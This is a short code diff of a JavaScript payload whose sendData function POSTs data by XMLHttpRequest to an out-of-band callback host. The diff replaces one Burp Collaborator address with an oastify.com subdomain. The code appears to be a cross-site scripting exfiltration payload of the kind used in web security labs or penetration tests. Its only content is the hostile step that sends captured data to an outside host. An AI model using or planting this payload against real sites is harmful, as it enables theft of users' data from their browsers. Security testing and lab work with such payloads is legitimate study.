@@ -12,7 +12,7 @@
  xhr.send(null);
 
 function sendData(data){
-    var url = 'https://randomrandom.burpcollaborator.net'
+    var url = 'https://ppix9ytbop5ra9e6ra2ji79lcci36tui.oastify.com'
     var xhr = new XMLHttpRequest();
     xhr.open('POST',url,true);
     xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
